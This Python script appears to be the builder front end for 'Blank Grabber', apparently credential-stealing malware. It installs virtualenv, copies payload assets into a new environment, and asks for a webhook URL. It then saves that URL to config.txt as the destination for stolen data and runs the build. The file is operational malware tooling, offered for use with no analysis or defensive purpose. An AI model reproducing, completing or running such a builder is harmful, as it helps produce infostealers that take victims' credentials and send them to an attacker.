import os, subprocess, shutil

def clear():
	os.system("cls")

def checkmodules():
	code = subprocess.run("virtualenv --version", capture_output= True, shell= True).returncode
	if code != 0:
		clear()
		print(format1("\u001b[33;1mInstalling virtualenv...") + "\n")
		os.system("pip install virtualenv")

def exit():
	os.system("pause > NUL")
	quit()

def format1(title, description= ""):
	return f"[{title}\u001b[0m] \u001b[37;1m{description}\u001b[0m"

def main():
	clear()
	os.system("title Blank Grabber Builder")

	if not os.path.isdir("Data"):
		print(format1("\u001b[31;1mERROR", "Data folder not found!"))
		exit()

	print(format1("\u001b[33;1mINFO", "Checking modules..."))
	checkmodules()
	clear()

	if not os.path.isfile("./env/Scripts/run.bat"):
		if not os.path.isdir("./env/Scripts"):
			print(format1("\u001b[33;1mINFO", "Creating virtualenv... (might take some time)"))
			subprocess.run("virtualenv env", capture_output= True, shell= True)
			clear()
		print(format1("\u001b[33;1mINFO", "Copying assets to virtualenv"))
		for i in os.listdir("./Data"):
			if os.path.isfile("./Data/" + i):
				shutil.copyfile("./Data/" + i, "env/Scripts/" + i)
			else:
				shutil.copytree("./Data/" + i, "env/Scripts/" + i)
		clear()
	while True:
		with open("./env/Scripts/config.txt") as file:
			if (existing_webhook := len(file.read()) > 100):
				print(format1("\u001b[33;1mINFO", "An existing webhook is found, enter a new one or press enter") + "\n")
		webhook = input(format1("\u001b[33;1mEnter Webhook") + "\b: \u001b[36;1m").strip()
		clear()
		if len(webhook) > 100 or (existing_webhook and len(webhook) == 0):
			break
	with open("./env/Scripts/config.txt", "w") as file:
		file.write(webhook)
	os.chdir("./env/Scripts")
	print("\u001b[0m", end= "", flush= True)
	os.system("run")

if __name__ == '__main__':
	main()